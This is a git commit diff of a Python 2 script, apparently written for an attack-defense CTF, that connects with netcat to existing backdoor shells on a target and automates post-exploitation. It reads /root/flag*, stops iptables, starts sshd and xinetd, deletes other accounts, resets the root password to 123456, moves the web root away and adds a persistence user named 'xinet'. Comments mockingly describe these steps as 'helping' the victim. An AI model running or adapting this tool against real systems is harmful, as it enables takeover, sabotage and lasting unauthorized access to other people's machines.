80efd7490688d3d8db6c2ca54455ad176dd06072
BrokenPaper <30953850+BrokenPaper@users.noreply.github.com>
2018-03-19 09:53:50 +0800

    减少代码量

--- auto_netcat.py
+++ auto_netcat.py
@@ -2,7 +2,6 @@
 
 import pexpect
 import optparse
-from netaddr import *
 import os
 
 parser = optparse.OptionParser()
@@ -13,63 +12,67 @@ parser.add_option('-t', dest='target', type='string')
 target = options.target
 port_list = [8080, 8081]
 
-# IPNetwork 支持192.168.100.0/24这样的
-for ip in IPNetwork(target):
-    for port in port_list:
-        cmd = 'nc %s %d' % (ip, port)
-        child = pexpect.spawn(cmd)
+if options.target is None:
+    parser.print_help()
+    exit(0)
 
-        # 判断后门的连通性
-        child.sendline('whoami')
-        # 多次经验,大概率是ROOT权限,如果没返回ROOT就跳过
-        if child.expect(['root', pexpect.TIMEOUT, pexpect.EOF], timeout=1) != 0:
-            print '[X] %s:%d close' % (ip, port)
-            continue
+for port in port_list:
+    cmd = 'nc %s %d' % (target, port)
+    child = pexpect.spawn(cmd)
 
-        # 这句话可以去掉
-        print '[#] %s:%d opened,start hakcing' % (ip, port)
+    # 判断后门的连通性
+    child.sendline('whoami')
+    # 多次经验,大概率是ROOT权限,如果没返回ROOT就跳过
+    if child.expect(['root', pexpect.TIMEOUT, pexpect.EOF], timeout=1) != 0:
+        print '[X] %s:%d close' % (target, port)
+        continue
 
-        # 储存的路径
-        path = os.path.join(os.getcwd(), 'nc_flag_%s_%d' % (ip, port))
+    print
 
-        # python 2.4以上才可以使用with语句
-        with open(path, 'wb') as f:
+    # 储存的路径
+    path = os.path.join(os.getcwd(), 'nc_flag_%s_%d' % (target, port))
 
-            child.logfile_read = f
+    # python 2.4以上才可以使用with语句
+    with open(path, 'wb+') as f:
 
-            # 利用Pyhton转换成交互式Shell,转完后输入的指令会显示两次..
-            # child.sendline('''python -c 'import pty; pty.spawn("/bin/bash")' ''')
+        child.logfile_read = f
 
-            # Get the flag
-            child.sendline('cat /root/flag*')
+        # 获取flag值
+        child.sendline('cat /root/flag*')
 
-            # 没多大用
-            child.sendline('/sbin/service sshd start')
-            child.sendline('/sbin/service xinetd start')
-            child.sendline('/sbin/service iptables stop')
+        # 没多大用
+        child.sendline('/sbin/service sshd start')
+        child.sendline('/sbin/service xinetd start')
+        child.sendline('/sbin/service iptables stop')
 
-            # Delete the funny backdoor users
-            child.sendline('/usr/sbin/userdel -f admin')
-            child.sendline('/usr/sbin/userdel -f hacker')
-            child.sendline('/usr/sbin/userdel -f test')
+        # 帮他删除后门账号
+        child.sendline('/usr/sbin/userdel -f admin')
+        child.sendline('/usr/sbin/userdel -f hacker')
+        child.sendline('/usr/sbin/userdel -f test')
 
-            # Help him to change password
-            child.sendline('echo root:123456 | /usr/sbin/chpasswd')
+        # 帮助他修改密码,当然这可能会导致他再也不能给自己加固了
+        child.sendline('echo root:123456 | /usr/sbin/chpasswd')
 
-            # Help him to remove dangerous website content
-            # child.sendline('rm -rf /var/www/html')
-            child.sendline('mv /var/www/html /tmp/backup/')
+        # 帮他删除危险的网页内容
+        child.sendline('mv /var/www/html /tmp/backup/')
 
-            # Tell him I'm helpful
-            # child.sendline('echo "XD You has been hacked" | wall')
+        # 这个就不用了
+        # child.sendline('echo "XD You has been hacked" | wall')
 
-            # 为后面的刷分做准备
-            child.sendline('/usr/sbin/useradd xinet')
-            child.sendline('passwd xinet')
-            child.sendline('123456')
-            child.sendline('123456')
+        # 为后面的刷分做准备
+        child.sendline('/usr/sbin/useradd xinet')
+        child.sendline('passwd xinet')
+        child.sendline('123456')
+        child.sendline('123456')
 
-            # Exit the game,also stop this backdoor
-            child.sendline('exit')
-            child.expect(pexpect.EOF)
-            print '[CTF] %s:%d finished hacking,see file %s' % (ip, port, path)
+        # 退出,后门也会被关闭
+        child.sendline('exit')
+        child.expect(pexpect.EOF)
+        print '[File] %s:%d : %s' % (target, port, path)
+
+    # 因为netcat和pexpect的原因,只能这么获取flag值
+    with open(path, 'r') as f:
+        flag = f.readlines()[1].replace('\n', '')
+        print '[Flag] %s:%d - %s' % (target, port, flag)
+        print '[Usage] python auto_flag.py -t %s -f %s' % (target, flag)
+        print
